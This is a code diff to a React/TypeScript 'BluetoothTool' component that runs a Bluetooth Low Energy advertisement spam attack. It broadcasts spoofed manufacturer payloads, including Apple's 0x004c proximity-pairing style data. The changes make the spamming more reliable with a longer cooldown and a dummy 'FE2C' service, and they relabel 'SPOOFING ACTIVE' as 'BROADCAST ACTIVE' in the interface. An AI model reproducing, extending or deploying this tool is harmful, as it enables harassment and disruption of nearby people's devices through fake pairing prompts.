@@ -1102,17 +1102,17 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
     try {
       const ready = await killActive();
       if (!ready) {
-        setMessage('Hardware Locked. Wait...');
+        setMessage('Radio Busy. Wait...');
         return;
       }
 
       setSpamming(true);
-      setMessage(`Priming ${type.toUpperCase()}...`);
+      setMessage(`Locking Radio: ${type.toUpperCase()}...`);
 
       await ensureBleEnabled();
 
-      // Post-init cooldown
-      await new Promise(r => setTimeout(r, 1000));
+      // Increased post-init cooldown for hardware stability
+      await new Promise(r => setTimeout(r, 1200));
 
       let mId = 0x004c; // Apple
       let mData: number[] = [0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30];
@@ -1125,24 +1125,24 @@ function BluetoothTool({ tool, onClose }: { tool: ToolDef, onClose: () => void }
         mData = [0x42, 0x09, 0x81, 0x02];
       }
 
-      // NO NAME - many drivers crash if name + mData > 26 bytes
+      // NO NAME - drivers crash if name + data exceeds limit
       try {
         const payload = {
           manufacturerId: mId,
-          manufacturerData: Array.from(new Uint8Array(mData)) // Explicit byte array for plugin
+          manufacturerData: Array.from(new Uint8Array(mData)),
+          services: ["FE2C"] // Dummy service to keep radio stack active
         };
 
         await BleClient.startAdvertising(payload);
-        setMessage(`SPOOFING ACTIVE: ${type.toUpperCase()}`);
+        setMessage(`BROADCAST ACTIVE: ${type.toUpperCase()}`);
       } catch (inner: any) {
-        console.error('BLE ADVERTISE NATIVE ERROR', inner);
-        // On some phones, this fails if Bluetooth is already "busy" with another process
-        setMessage(`DRIVER ERROR: ${inner.message || 'Radio Locked'}. Try toggling phone Bluetooth off/on.`);
+        console.error('BLE ADVERTISE FAIL', inner);
+        setMessage(`DRIVER FAIL: ${inner.message || 'Busy'}. Cycle phone Bluetooth.`);
         setSpamming(false);
       }
     } catch (error: any) {
-      console.error('BLE SPAM CRITICAL FAIL', error);
-      setMessage('Hardware Fault. Cycle BT.');
+      console.error('BLE SPAM FAIL', error);
+      setMessage('Hardware Fault. Retry.');
       setSpamming(false);
     }
   };
